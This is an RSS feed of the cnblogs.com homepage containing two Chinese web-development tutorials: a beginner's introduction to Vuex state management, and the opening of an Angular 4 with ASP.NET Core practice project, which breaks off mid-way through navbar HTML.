<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>vuex的简易入门 - 唱歌的小洋葱</title>
<link>http://www.cnblogs.com/vensent-Onion/p/7761724.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/vensent-Onion/p/7761724.html</guid>
<description>&lt;p class=&quot;p1&quot;&gt;vuex&lt;span class=&quot;s1&quot;&gt;学习&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;&lt;span class=&quot;s2&quot;&gt;Vuex入门其实很简单 &lt;span class=&quot;s2&quot;&gt;当我们项目数据量很庞大的时候&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;比如一个接口数据在多个组件之间重复使用多次&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;我们这里采用的是&lt;span class=&quot;s2&quot;&gt;vue-cli构建的项目目录&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;当然前面的npm install vux&lt;span class=&quot;s1&quot;&gt;什么的就不说了&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;我们创建好&lt;span class=&quot;s2&quot;&gt;store模块之后 &lt;span class=&quot;s2&quot;&gt;首先你要确保你的实例上面有&lt;span class=&quot;s2&quot;&gt;store&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p3&quot;&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p4&quot;&gt;&lt;span class=&quot;s3&quot;&gt;&lt;strong&gt;1.&lt;/strong&gt;引入&lt;span class=&quot;s3&quot;&gt;&lt;strong&gt;store&lt;/strong&gt; 并且挂载在实例上&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151144449-1573719046.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151219496-1353344796.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;好，然后，创建目录我们的&lt;span class=&quot;s2&quot;&gt;store的目录大概就是下面这样子&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;&lt;span class=&quot;s1&quot;&gt;你可以使用单独的actions getters mutations &lt;span class=&quot;s1&quot;&gt;也可以使用模块化【modules】&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;我们这里采用的是模块化 &lt;span class=&quot;s2&quot;&gt;modules 比如我们有一个狗【&lt;span class=&quot;s2&quot;&gt;dog】的模块&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;【&lt;span class=&quot;s2&quot;&gt;modules】 &lt;span class=&quot;s2&quot;&gt;对象允许将单一的 &lt;span class=&quot;s2&quot;&gt;Store 拆分为多个 &lt;span class=&quot;s2&quot;&gt;Store 的同时保存在单一的状态树中。随着应用复杂度的增加，这种拆分能够更好地组织代码&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151309371-1793466187.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;先来看我们的【store/index.js&lt;span class=&quot;s1&quot;&gt;】&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;这里我们就export&lt;span class=&quot;s1&quot;&gt;一下store store&lt;span class=&quot;s1&quot;&gt;里面是按照模块来的&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151420027-819035106.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;继续 &lt;span class=&quot;s2&quot;&gt;我们开始进入模块【&lt;span class=&quot;s2&quot;&gt;dog.js】&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;首先你得有一个&lt;span class=&quot;s2&quot;&gt;types吧 &lt;span class=&quot;s2&quot;&gt;对不对 &lt;span class=&quot;s2&quot;&gt;放在外面统一管理就好 &lt;span class=&quot;s2&quot;&gt;后面引入即可&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;&lt;span class=&quot;s2&quot;&gt;&lt;span class=&quot;s2&quot;&gt;&lt;span class=&quot;s2&quot;&gt;&lt;span class=&quot;s2&quot;&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151501277-623615771.png&quot; alt=&quot;&quot;/&gt; &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;然后先看一下整体的代码结构&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151519511-1987986378.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;【别着急】我们依次展开了哈&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;【state&lt;span class=&quot;s1&quot;&gt;】&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;&lt;span class=&quot;s2&quot;&gt;state 定义了应用状态的数据结构，同样可以在这里设置默认的初始状态&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151631777-1647279781.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;s1&quot;&gt;【mutations&lt;span class=&quot;s1&quot;&gt;】&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;调用 &lt;span class=&quot;s2&quot;&gt;mutations 是唯一允许更新应用状态的地方。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;&lt;span class=&quot;s2&quot;&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151647215-1390527708.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;【actions&lt;span class=&quot;s1&quot;&gt;】&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;&lt;span class=&quot;s2&quot;&gt;Actions 即是定义提交触发更改信息的描述，常见的例子有从服务端获取数据，在数据获取完成后会调用&lt;span class=&quot;s2&quot;&gt;store.commit()来调用更改 &lt;span class=&quot;s2&quot;&gt;Store 中的状态。可以在组件中使用&lt;span class=&quot;s2&quot;&gt;dispatch来发出 &lt;span class=&quot;s2&quot;&gt;Actions。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151707590-490074640.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;s1&quot;&gt;【getters&lt;span class=&quot;s1&quot;&gt;】&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;&lt;span class=&quot;s2&quot;&gt;Getters 允许组件从 &lt;span class=&quot;s2&quot;&gt;Store 中获取数据，可以进行筛选等等 &lt;span class=&quot;s2&quot;&gt;这里是可以进行数据操作的&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151729511-1089286268.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后 &lt;span class=&quot;s2&quot;&gt;【输出一下】&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;s2&quot;&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151752090-419033221.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;&lt;span class=&quot;s2&quot;&gt;OK了 &lt;span class=&quot;s2&quot;&gt;一个简单的额&lt;span class=&quot;s2&quot;&gt;vuex我们搭建完毕 &lt;span class=&quot;s2&quot;&gt;我们回到我们的组件开始调用 &lt;span class=&quot;s2&quot;&gt;怎么用呢&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;首先我们需要引入&lt;span class=&quot;s2&quot;&gt;vuex的辅助函数 &lt;span class=&quot;s2&quot;&gt;这里的话我引入三个 &lt;span class=&quot;s2&quot;&gt;方便都看一下效果&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;辅助函数【mapState&lt;span class=&quot;s1&quot;&gt;】【mapActions&lt;span class=&quot;s1&quot;&gt;】【mapgetters&lt;span class=&quot;s1&quot;&gt;】&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;我们在时间周期 computed&lt;span class=&quot;s1&quot;&gt;的时候引入mapState mapGetters&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151805605-1502343997.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151815996-49943816.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p class=&quot;p6&quot;&gt;【注意&lt;span class=&quot;s4&quot;&gt;⚠️】&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;为什么要把&lt;span class=&quot;s2&quot;&gt;mapState放在这里讲 &lt;span class=&quot;s2&quot;&gt;是因为又个坑&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;一般而言 &lt;span class=&quot;s2&quot;&gt;我们是直接 是不是很多人都这么做啊 嘻嘻嘻 也没错 前提是你不使用modules&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031151830730-532570878.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;我们发现 &lt;span class=&quot;s1&quot;&gt;我们的dogUrl&lt;span class=&quot;s1&quot;&gt;是undefined&lt;span class=&quot;s1&quot;&gt;为什么呢 页面不渲染 打印的时候undefined&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;但是store里面确实有一个dog下面的dogUrl啊 不对 位置变了！！！！&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;我们打印一下&lt;span class=&quot;s2&quot;&gt;store 发现了问题 &lt;span class=&quot;s2&quot;&gt;因为我们使用了&lt;span class=&quot;s2&quot;&gt;modules 所以 &lt;span class=&quot;s2&quot;&gt;dogUrl 的位置发生了变化&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;应该是这样 this.$store.state.dog.dogUrl&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;而不是这样this.$store.state.dogUrl&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;所以我们采用第二种写法&lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/982725/201710/982725-20171031152010465-791652371.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;好了 &lt;span class=&quot;s2&quot;&gt;现在&lt;span class=&quot;s2&quot;&gt;state也是可以直接使用的了&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p2&quot;&gt;那么 &lt;span class=&quot;s2&quot;&gt;你入门了吗？&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;p5&quot;&gt; &lt;/p&gt;
</description>
<pubDate>Tue, 31 Oct 2017 07:21:00 +0000</pubDate>
<dc:creator>唱歌的小洋葱</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/vensent-Onion/p/7761724.html</dc:identifier>
</item>
<item>
<title>使用angular4和asp.net core 2 web api做个练习项目(一) - solenovex</title>
<link>http://www.cnblogs.com/cgzl/p/7755801.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/cgzl/p/7755801.html</guid>
<description>&lt;p&gt;这是一篇学习笔记. angular 5 正式版都快出了, 不过主要是性能升级.&lt;/p&gt;
&lt;p&gt;我认为angular 4还是很适合企业的, 就像.net一样.&lt;/p&gt;
&lt;p&gt;我用的是windows 10&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;git for windows&lt;/strong&gt;: 官网很慢, 所以找一个镜像站下载: &lt;a href=&quot;https://github.com/waylau/git-for-win&quot; target=&quot;_blank&quot;&gt;https://github.com/waylau/git-for-win&lt;/a&gt;, 淘宝镜像的速度还是蛮快的:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030183003043-1772215704.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;安装的时候, 建议选择这个, 会添加很多命令行工具: &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;nodejs&lt;/strong&gt;: 去官网下载就行: &lt;a href=&quot;https://nodejs.org/en/&quot; target=&quot;_blank&quot;&gt;https://nodejs.org/en/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;正常安装即可. npm的版本不要低于5.0吧:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030183250574-784531447.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;angular-cli&lt;/strong&gt;, 官网: &lt;a href=&quot;https://github.com/angular/angular-cli&quot; target=&quot;_blank&quot;&gt;https://github.com/angular/angular-cli&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
npm install -g @angular/cli
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;visual studio code&lt;/strong&gt;: &lt;a href=&quot;https://code.visualstudio.com/&quot; target=&quot;_blank&quot;&gt;https://code.visualstudio.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;and &lt;strong&gt;visual studio 2017&lt;/strong&gt; of course.&lt;/p&gt;

&lt;p&gt;进入命令行在某个地方执行命令:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
ng new client-panel
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这就会建立一个client-panel文件夹, 里面是该项目的文件, 然后它会立即执行npm install命令(&lt;strong&gt;这里不要使用淘宝的cnpm进行安装, 有bug&lt;/strong&gt;), 稍等一会就会结束.&lt;/p&gt;
&lt;p&gt;使用vscode打开该目录, 然后在vscode里面打开terminal:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030184306293-308019642.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;terminal默认的可能是powershell, 如果你感觉powershell有点慢的话, 可以换成bash(安装git时候带的)或者windows command line等.&lt;/p&gt;
&lt;p&gt;第一次打开terminal的时候, vscode上方会提示你配置terminal, 这时就可以更换默认的terminal. 否则的话, 你可以点击菜单file-reference-settings, 自己选择一个terminal应用:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030184645293-1795474809.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;同样可以安装几个vscode的插件:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030184824965-887814084.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后试运行一下项目, 在terminal执行 ng serve, 如果没问题的话, 大概是这样: &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030184927199-269511505.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;浏览器运行: &lt;a href=&quot;http://localhost:4200/&quot; target=&quot;_blank&quot;&gt;http://localhost:4200&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030185102840-1859921815.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;安装bootstrap4, tether, jquery等:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
npm install bootstrap@4.0.0-beta.2 tether jquery --save
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;安装成功后, 打开 .angular-cli.json, 把相关的css和js添加进去:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030185903558-1559438928.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后在运行试试 ng serve, 刷新:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030185948871-1376201928.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;字体已经改变, bootstrap起作用了.&lt;/p&gt;

&lt;h3&gt;建立dashboard:&lt;/h3&gt;
&lt;p&gt;terminal执行&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
ng g component components/dashboard
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;执行成功后会生成4个文件:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030190254308-770157233.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;并且会自动在app.module.ts里面声明:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030190332058-1710679429.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;建立其他 components:&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
ng g component components/&lt;span&gt;clients
ng g component components&lt;/span&gt;/&lt;span&gt;clientDetails
ng g component components&lt;/span&gt;/&lt;span&gt;addClient
ng g component components&lt;/span&gt;/&lt;span&gt;editClient
ng g component components&lt;/span&gt;/&lt;span&gt;navbar
ng g component components&lt;/span&gt;/sidebar&lt;br/&gt;ng g component components/login&lt;br/&gt;ng g component components/register&lt;br/&gt;ng g component components/settings&lt;br/&gt;ng g component components/pageNotFound
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030190855715-601011819.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;56&quot;&gt;
&lt;pre&gt;
import { BrowserModule } from '@angular/platform-browser'&lt;span&gt;;
import { NgModule } from &lt;/span&gt;'@angular/core'&lt;span&gt;;
&lt;span&gt;import { RouterModule, Routes } from &lt;/span&gt;&lt;/span&gt;&lt;span&gt;'@angular/router'&lt;/span&gt;&lt;span&gt;&lt;span&gt;;&lt;/span&gt;

import { AppComponent } from &lt;/span&gt;'./app.component'&lt;span&gt;;
import { DashboardComponent } from &lt;/span&gt;'./components/dashboard/dashboard.component'&lt;span&gt;;
import { ClientsComponent } from &lt;/span&gt;'./components/clients/clients.component'&lt;span&gt;;
import { ClientDetailsComponent } from &lt;/span&gt;'./components/client-details/client-details.component'&lt;span&gt;;
import { AddClientComponent } from &lt;/span&gt;'./components/add-client/add-client.component'&lt;span&gt;;
import { EditClientComponent } from &lt;/span&gt;'./components/edit-client/edit-client.component'&lt;span&gt;;
import { NavbarComponent } from &lt;/span&gt;'./components/navbar/navbar.component'&lt;span&gt;;
import { SidebarComponent } from &lt;/span&gt;'./components/sidebar/sidebar.component'&lt;span&gt;;
import { LoginComponent } from &lt;/span&gt;'./components/login/login.component'&lt;span&gt;;
import { RegisterComponent } from &lt;/span&gt;'./components/register/register.component'&lt;span&gt;;
import { SettingsComponent } from &lt;/span&gt;'./components/settings/settings.component'&lt;span&gt;;
import { PageNotFoundComponent } from &lt;/span&gt;'./components/page-not-found/page-not-found.component'&lt;span&gt;;

&lt;span&gt;const appRoutes: Routes &lt;/span&gt;&lt;/span&gt;&lt;span&gt;= [
  { path: '', component: DashboardComponent },
  { path: 'register', component: RegisterComponent },
  { path: 'login'&lt;/span&gt;&lt;span&gt;&lt;span&gt;, component: LoginComponent }
];
&lt;/span&gt;
@NgModule({
  declarations: [
    AppComponent,
    DashboardComponent,
    ClientsComponent,
    ClientDetailsComponent,
    AddClientComponent,
    EditClientComponent,
    NavbarComponent,
    SidebarComponent,
    LoginComponent,
    RegisterComponent,
    SettingsComponent,
    PageNotFoundComponent
  ],
  imports: [
    BrowserModule,
    &lt;span&gt;RouterModule.forRoot(appRoutes)&lt;/span&gt;
  ],
  providers: [],
  bootstrap: [AppComponent]
})
export class AppModule { }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;添加router-outlet:&lt;/h3&gt;
&lt;p&gt;打开app.component.html, 清空内容, 添加一个div(&lt;span&gt;可以输入div.container然后按tab健&lt;/span&gt;):&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;container&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;router-outlet&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;router-outlet&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;现在刷新浏览器, 大约这样:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030191459668-1364864561.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;添加navbar:&lt;/h3&gt;
&lt;p&gt;修改navbar.component.html:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;nav &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;navbar navbar-expand-md navbar-light bg-light&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;container&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;navbar-brand&quot;&lt;/span&gt;&lt;span&gt; href&lt;/span&gt;&lt;span&gt;=&quot;#&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Client Panel&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;button &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;navbar-toggler&quot;&lt;/span&gt;&lt;span&gt; type&lt;/span&gt;&lt;span&gt;=&quot;button&quot;&lt;/span&gt;&lt;span&gt; data-toggle&lt;/span&gt;&lt;span&gt;=&quot;collapse&quot;&lt;/span&gt;&lt;span&gt; data-target&lt;/span&gt;&lt;span&gt;=&quot;#navbarsExampleDefault&quot;&lt;/span&gt;&lt;span&gt; aria-controls&lt;/span&gt;&lt;span&gt;=&quot;navbarsExampleDefault&quot;&lt;/span&gt;&lt;span&gt;
      aria-expanded&lt;/span&gt;&lt;span&gt;=&quot;false&quot;&lt;/span&gt;&lt;span&gt; aria-label&lt;/span&gt;&lt;span&gt;=&quot;Toggle navigation&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;span &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;navbar-toggler-icon&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;span&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;button&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;collapse navbar-collapse&quot;&lt;/span&gt;&lt;span&gt; id&lt;/span&gt;&lt;span&gt;=&quot;navbarsExampleDefault&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;ul &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;navbar-nav mr-auto&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;li &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;nav-item&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
